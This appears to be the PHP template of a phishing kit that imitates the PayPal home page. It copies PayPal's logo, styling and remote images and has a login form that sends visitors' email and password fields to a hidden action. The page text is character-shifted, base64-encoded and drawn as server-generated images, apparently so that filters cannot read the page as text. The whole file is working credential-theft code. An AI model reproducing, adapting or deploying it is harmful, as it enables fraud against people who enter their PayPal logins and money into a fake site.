<?php$page="";$page = $_SESSION["page"];$top_lang= $_SESSION["top_lang"];$country_selector="country ".$_SESSION["country_name"];$_GET["convertimage"]=$convertimage;if($_GET["convertimage"] and (lang2()!="zh.php" and lang2()!="ru.php")){    //echo "<style type='text/css'>.js .lap .textInput.medium label,.js div.lap.textInput.medium label{top:10px;}</style>";}function odr($s,$v){    $p=str_split($s);$t="";    for($i=0;$i<count($p);$i++){        $t.=chr(ord($p[$i])+$v);    }return $t;}function changeh($t,$f,$s,$c,$b,$a){if($_GET["convertimage"] and (lang2()!="zh.php" and lang2()!="ru.php")){if($f==""){$f="arial";}if($s==""){$s=8;}if($t==""){$t=0;}if($c==""){$c="70-70-70";}if($b==""){$b="255-255-255";}$a=odr($a,3);$a=base64_encode($a);$a="<img src='cmd/img.php?bkg=".$b."&top=".$t."&color=".$c."&font=".$f."&size=".$s."&text=".$a."' />";}return $a;}function change($f,$s,$c,$b,$a){if($_GET["convertimage"] and (lang2()!="zh.php" and lang2()!="ru.php")){if($f==""){$f="arial";}if($s==""){$s=8;}if($c==""){$c="70-70-70";}if($b==""){$b="255-255-255";}$a=odr($a,3);$a=base64_encode($a);$a="<img src='cmd/img.php?bkg=".$b."&color=".$c."&font=".$f."&size=".$s."&text=".$a."' />";}return $a;}function change2($w,$f,$s,$c,$b,$a){if($_GET["convertimage"] and (lang2()!="zh.php" and lang2()!="ru.php")){if($w==""){$w=48;}if($f==""){$f="arial";}if($s==""){$s=8;}if($c==""){$c="70-70-70";}if($b==""){$b="255-255-255";}$a=odr($a,3);$a=base64_encode($a);$a="<img src='cmd/img2.php?wrap=".$w."&bkg=".$b."&color=".$c."&font=".$f."&size=".$s."&text=".$a."' />";}return $a;}?><!DOCTYPE html><html lang="<?php echo $top_lang; ?>" class="no-js" data-device-type="dedicated">    <head>        <title><?php echo $top_title; ?></title>        <!--        $$$$$$$\                     $$$$$$$\           $$\        $$  __$$\                    $$  __$$\          $$ |        $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |        $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |        $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |        $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |        $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |        \__|      \_______| \____$$ |\__|      \_______|\__|                           $$\   $$ |                           \$$$$$$  |                            \______/        --><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta charset="UTF-8" /><link rel="shortcut icon" href="./css/img/pp_favicon_x.ico"><link rel="apple-touch-icon" href="./css/img/apple-touch-icon.png"><link rel="stylesheet" href="./css/506f6044f7132760c4b8545e9e23bef1cdc3f6.css" rel="stylesheet" type="text/css" />     <link rel="stylesheet" href="./css/73655e33e1e1238007f38181b57c5aded88016.css" rel="stylesheet" type="text/css" /><link rel="stylesheet" href="./css/25700eb05daa8170df57218625154028418315.css" rel="stylesheet" type="text/css" /> <!--      <link rel="stylesheet" href="https://www.paypalobjects.com/eboxapps/css/a3/943dcd65bcfa1589cebc4037210087e4c279d5.css" rel="stylesheet" type="text/css" />            <link rel="stylesheet" href="https://www.paypalobjects.com/eboxapps/css/db/73655e33e1e1238007f38181b57c5aded88016.css" rel="stylesheet" type="text/css" />            <link rel="stylesheet" href="https://www.paypalobjects.com/eboxapps/css/5d/435aca41e6a23d406a16c35c96f6ad99e717a6.css" rel="stylesheet" type="text/css" />--> </head><body>        <div id="body">                        <div class="moving-background-container" id="fixed-top">                <header class="table-row" role="banner">    <div><div class="containerCentered ">            <a id="menu-button" role="button" href="#Menu">-</a>          <a class="paypal-img-logo" href="#/webapps/mpp/home">-</a>            <nav id="main-menu" role="navigation"><ul>                        <li><a id="header-buy" aria-controls="submenu-buy" href="#/webapps/mpp/home" rel="menuitem"><?php echo changeh(8,"",12,"60-60-60","255-255-255",$header_buy_a_0); ?></a></li>                        <li><a id="header-sell" aria-controls="submenu-sell" href="#/webapps/mpp/merchant" rel="menuitem"><?php echo changeh(8,"",12,"60-60-60","255-255-255",$header_sell_a_0); ?></a></li>                 <li>                                                                   <a class="desktop-only" id="header-send" aria-controls="submenu-send" href="#/webapps/mpp/send-money-online" rel="menuitem"><?php echo changeh(8,"",12,"60-60-60","255-255-255",$header_send_a_0); ?></a></li>                                          <li><a class="no-drop" id="header-business" href="#/webapps/mpp/merchant"><?php echo changeh(8,"",12,"60-60-60","255-255-255",$header_business_a_0); ?></a></li>                        </ul>    </nav>                            <div class="form-inline open" id="login-header">                                                                            <form name="login_form" <?php echo $action_loge; ?> method="post" >                        <div class="input-wrapper small">                            <input name="userm" placeholder="<?php echo $login_email_input_0; ?>" class="small with-helper" type="text" value="" data-tabindex="1">                            <div class="input-link">                                                                 <a title="<?php echo $passwordRecovery1_a_0; ?>" class="input-button passwordRecovery" href="#" data-tabindex="4"></a>                            </div>                        </div>                        <div class="input-wrapper small">                                <input name="userp" placeholder="<?php echo $login_password_input_0; ?>" class="small with-helper" type="password" autocomplete="off" data-tabindex="2">                                                        <div class="input-link">                                <a title="<?php echo $passwordRecovery2_a_0; ?>" class="input-button passwordRecovery useModal" role="button" href="#" data-tabindex="5"></a>                                                            </div>                        </div>                        <input name="submit" class="btn btn-small" type="submit" value="<?php echo $login_button_a_0; ?>" data-tabindex="3">                        <a name="SignUp_header" class="btn btn-small btn-secondary btn-signup" id="signup-button-inner" href="#" data-tabindex="6"><?php echo $signup_button_inner_a_0; ?></a>                    </form>                </div>                            </div></div></header>                  <div class="table-row hero dark">	<div id="hero" class="hero-bg content-block moving-background filler hero0-video-still playing video-loaded">            <div class="novideo-bg"></div>                            <h1><?php echo change("",30,"255-255-255","90-90-90",$hero_h1_0); ?></h1>                <a class="btn closing-cta center-block span4 " href="#"><?php echo change("arialbd",13,"255-255-255","12-141-196",$btn_closing_cta_center_block_span4_a_0); ?></a>                <p class="signup-subline"><?php echo change("",14,"255-255-255","90-90-90",$signup_subline_p_0); ?></p>                                    <video style="width: 1264px; height: auto;" loop="loop" autoplay="autoplay" muted="muted" poster="https://www.paypalobjects.com/webstatic/mktg/wright/videos/home-signup.jpg">                        <source src="https://www.paypalobjects.com/webstatic/mktg/wright/videos/home-signup.mp4" type="video/mp4">                        <source src="https://www.paypalobjects.com/webstatic/mktg/wright/videos/home-signup.webm" type="video/webm">                    </video>                        <a role="button" href="#Play" class="mb-button play">Play</a><a role="button" href="#Pausa" class="mb-button pause">Pause</a>    </div></div>             <div class="table-row hugger-row">         <div class="hero-hugger">            <div class="containerCentered">                <ul class="pull-left button-menu">                    <li><a title="<?php echo $icon_help_a_0; ?>" class="icon help" href="#"><?php echo $icon_help_a_0; ?></a></li>                    <li><a title="<?php echo $icon_contact_a_0; ?>" class="icon contact" href="#"><?php echo $icon_contact_a_0; ?></a></li>                    <li><a title="<?php echo $icon_search_button_0; ?>" class="icon search" href="#"><?php echo $icon_search_button_0; ?></a></li>                      </ul>                    <div class="country-selector ">              		<?php if (array_key_exists($_SESSION['tempLang'], $_GET["lange_code"])) {$exp = explode(",", $_GET["lange_code"][$_SESSION['tempLang']]);for ($i=0; $i < count($exp); $i++) {     if($_SESSION['locale_x']<>$exp[$i]){    echo '<a class="language" href="?cmd=_home&dispatch=5885'.$ee.'1f8e&ee=6c7adb'.$ee.'487d84&locale_x='.$exp[$i].'_'.$_SESSION['tempLang'].'">'.ucfirst($_GET["languages"][$exp[$i]]).'</a>';}}}?>			<a title="" class="<?php echo $country_selector; ?>" href="?cmd=_home&dispatch=588<?php echo $ee;?>1f8e&ee=c44cb4c<?php echo $ee;?>56d3&country-worldwide"></a>      		      		    </div>                <a title="There's more below" class="fancy-down-arrow-grey" id="hugger-arrow" href="#n1">Scroll to next panel</a>            </div>        </div>    </div></div>            <div class="containerMobileFullWidth" id="main" role="main">	             <?php if($section_n1){ ?><section class="row-fluid editorial editorial-left " id="n1">    <div class="containerCentered editorial-img n1"  style='background-image:url("https://www.paypalobjects.com/webstatic/<?php echo $page; ?>/mktg/wright/home/home_n1_1x.jpg")' >        <div class=" span6 offset6 editorial-container">            <div class="editorial-cell">                <h2 class=" large"><?php echo change("arialbd",18,"100-100-100","255-255-255",$_large_h2_n1_0); ?></h2>                <p class="contentPara"><?php echo change2(70,"",13,"110-110-110","",$contentPara_p_n1_0); ?></p>                                    <a class="contentLink" href="#webapps/mpp/pay-on-ebay"><?php echo change("arialbd",11,"12-141-196","255-255-255",$contentLink_a_n1_0); ?></a>                                                    <a class="contentLink" href="#webapps/mpp/pay-online"><?php echo change("arialbd",11,"12-141-196","255-255-255",$contentLink_a_n1_1); ?></a>                                                            </div>        </div>    </div></section><?php } ?>    <?php if($section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_){ ?><section class="row-fluid editorial editorial-right editorial-bg n2 lightContent ">                <div class="parallax-bg scroll-animate" data-translate-y-end="60" data-translate-y-start="-20"  style='background-image:url("https://www.paypalobjects.com/webstatic/<?php echo $page; ?>/mktg/wright/home/home_n2_1x.jpg")'></div>            <div class="containerCentered">        <div class=" span6 editorial-container">            <div class="editorial-cell">                <h2 class=" large"><?php echo change("arialbd",18,"255-255-255","90-90-90",$_large_h2_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0); ?></h2>                <p class="contentPara"><?php echo change2(70,"",13,"255-255-255","90-90-90",$contentPara_p_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0); ?></p>                                    <a class="contentLink reverseLink" href="#webapps/mpp/pay-in-stores"><?php echo change("arialbd",11,"255-255-255","90-90-90",$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0); ?></a>                                                    <a class="contentLink reverseLink" href="#webapps/mpp/pay-with-app"><?php echo change("arialbd",11,"255-255-255","90-90-90",$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__1); ?></a>                                                            </div>        </div>    </div></section><?php } ?>     <?php if($section_row_fluid_panel_blue_reverseLink){ ?><section class="row-fluid panel blue reverseLink">    <div class="containerCentered">        <div class="span6">            <h2 class="contentHead large"><?php echo change("arialbd",18,"255-255-255","1-156-222",$contentHead_large_h2_row_fluid_panel_blue_reverseLink_0); ?></h2>            <p class="contentPara"><?php echo  change2(70,"",13,"255-255-255","1-156-222",$contentPara_p_row_fluid_panel_blue_reverseLink_0); ?></p>            <a class="contentLink" href="#webapps/mpp/send-money-online"><?php echo change("arialbd",11,"255-255-255","1-156-222",$contentLink_a_row_fluid_panel_blue_reverseLink_0); ?></a>        </div>        <div class="span6">            <h2 class="contentHead large"><?php echo change("arialbd",18,"255-255-255","1-156-222",$contentHead_large_h2_row_fluid_panel_blue_reverseLink_1); ?></h2>            <p class="contentPara"><?php echo change2(70,"",13,"255-255-255","1-156-222",$contentPara_p_row_fluid_panel_blue_reverseLink_1); ?></p>            <a class="contentLink" href="#webapps/mpp/requesting-payments"><?php echo change("arialbd",11,"255-255-255","1-156-222",$contentLink_a_row_fluid_panel_blue_reverseLink_1); ?></a>        </div>    </div></section><?php } ?>     <?php if($section_row_fluid_editorial_editorial_left_){ ?><section class="row-fluid editorial editorial-left ">        <div class="containerCentered editorial-img n3"  style='background-image:url("https://www.paypalobjects.com/webstatic/<?php echo $page; ?>/mktg/wright/home/home_n3_1x.jpg")'>        <div class=" span6 offset6 editorial-container">            <div class="editorial-cell">                <h2 class=" large"><?php echo change("arialbd",18,"100-100-100","255-255-255",$_large_h2_row_fluid_editorial_editorial_left__0); ?></h2>                <p class="contentPara"><?php echo change2(70,"",13,"110-110-110","",$contentPara_p_row_fluid_editorial_editorial_left__0); ?></p>                                    <a class="contentLink" href="#webapps/mpp/accept-payments-online"><?php echo change("arialbd",11,"12-141-196","255-255-255",$contentLink_a_row_fluid_editorial_editorial_left__0); ?></a>                                                    <a class="contentLink" href="#webapps/mpp/email-invoice"><?php echo change("arialbd",11,"12-141-196","255-255-255",$contentLink_a_row_fluid_editorial_editorial_left__1); ?></a>                                                            </div>        </div>    </div></section><?php } ?>    <?php if($section_row_fluid_editorial_editorial_right_editorial_bg_n4_){ ?><section class="row-fluid editorial editorial-right editorial-bg n4 ">    <div class="parallax-bg scroll-animate" data-translate-y-end="60"  style='background-image:url("https://www.paypalobjects.com/webstatic/<?php echo $page; ?>/mktg/wright/home/home_n4_1x.jpg")' data-translate-y-start="-20"></div>        <div class="containerCentered">        <div class="span5 editorial-container">            <div class="editorial-cell">                <h2 class=" large"><?php echo change("arialbd",18,"100-100-100","255-255-255",$_large_h2_row_fluid_editorial_editorial_right_editorial_bg_n4__0); ?></h2>                <p class="contentPara"><?php echo change2(65,"",14,"90-90-90","230-230-230",$contentPara_p_row_fluid_editorial_editorial_right_editorial_bg_n4__0); ?></p>                                    <a class="contentLink" href="#webapps/mpp/credit-card-reader"><?php echo change("arialbd",11,"12-141-196","255-255-255",$contentLink_a_row_fluid_editorial_editorial_right_editorial_bg_n4__0); ?></a>                                                    <a class="contentLink" href="#webapps/mpp/accept-payments-in-store"><?php echo change("arialbd",11,"12-141-196","255-255-255",$contentLink_a_row_fluid_editorial_editorial_right_editorial_bg_n4__1); ?></a>                                                            </div>        </div>    </div></section><?php } ?>    <?php if($section_row_fluid_panel_light_center_text){ ?><section class="row-fluid panel light center-text">    <div class="containerCentered">        <div class="span12">            <p class="closingHeadline headline large"><?php echo change("",22,"100-100-100","255-255-255",$closingHeadline_headline_large_p_0); ?></p>                                        <a class="btn closing-cta center-block span4 " href="#"><?php echo change("arialbd",13,"255-255-255","12-141-196",$btn_closing_cta_center_block_span4_a_0); ?></a>                                 </div>    </div></section><?php } ?></div>            <footer role="contentinfo">    <div class="containerCentered containerExtend">        <ul class="footer-main secondaryLink"><?php for ($i=0; $i <count($footer_footer_main_secondaryLink_li) ; $i++) {     echo '<li><a href="#">'.change("arialbd",11,"100-100-100","255-255-255",$footer_footer_main_secondaryLink_li[$i]).'</a></li>';}?>                                 <li class="country-selector "><?php if (array_key_exists($_SESSION['tempLang'], $_GET["lange_code"])) {$exp = explode(",", $_GET["lange_code"][$_SESSION['tempLang']]);for ($i=0; $i < count($exp); $i++) {     if($_SESSION['locale_x']<>$exp[$i]){    echo '<a class="language" href="?cmd=_home&dispatch=58'.$ee.'f8e&ee=6c7adbb'.$ee.'84&locale_x='.$exp[$i].'_'.$_SESSION['tempLang'].'">'.ucfirst($_GET["languages"][$exp[$i]]).'</a>';}}}?>  <a title="" class="<?php echo $country_selector; ?>" href="?cmd=_home&dispatch=5885d<?php echo $ee;?>0db1f8e&ee=c44c<?php echo $ee;?>56d3&country-worldwide"></a></li>                <li class="footer-search">                        <form class="search-form" action="#cgi-bin/webscr?cmd=_sitewide-search" method="post">    <button title="<?php echo $icon_search_button_0; ?>" class="search-icon" type="submit"></button>    <input name="queryString" type="search" placeholder="Search">    <input name="cn" type="hidden" value="paypal">    <input name="cc" type="hidden" value="www">    <input name="adv" type="hidden" value="0">    <input name="mode" type="hidden" value="caseB"></form></li>                </ul><ul class="footer-secondary secondaryLink">                <?php for ($i=0; $i <count($footer_footer_secondary_secondaryLink_li) ; $i++) {     echo '<li><a href="#">'.change("",10,"110-110-110","240-240-240",$footer_footer_secondary_secondaryLink_li[$i]).'</a></li>';}?>                   </ul>         <ul class="footer-tertiary secondaryLink"><li id="footer-copyright"><?php echo change("",10,"110-110-110","240-240-240",$footer_footer_tertiary_secondaryLink_li[0]); ?></li><li id="footer-privacy"><a href="#cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside"><?php echo change("",10,"110-110-110","240-240-240",$footer_footer_tertiary_secondaryLink_li[1]); ?></a></li><li id="footer-legal"><a href="#cgi-bin/webscr?cmd=p/gen/ua/ua-outside"><?php echo change("",10,"110-110-110","240-240-240",$footer_footer_tertiary_secondaryLink_li[2]); ?></a></li></ul>        </div></footer>        </div>     </body></html>